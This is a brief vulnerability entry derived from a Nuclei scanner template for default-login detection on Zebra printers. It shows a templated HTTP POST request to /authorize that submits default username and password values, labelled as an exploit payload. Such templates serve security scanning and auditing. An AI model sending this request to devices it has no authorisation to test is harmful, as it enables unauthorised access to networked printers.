# Vulnerability: Zebra - Default Login
**Classification:** ZEBRA
**Source:** Nuclei Template (`zebra-printer-default-login.yaml`)

## Description
Zebra default login credentials was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /authorize HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

0={{username}}&1={{password}}
```

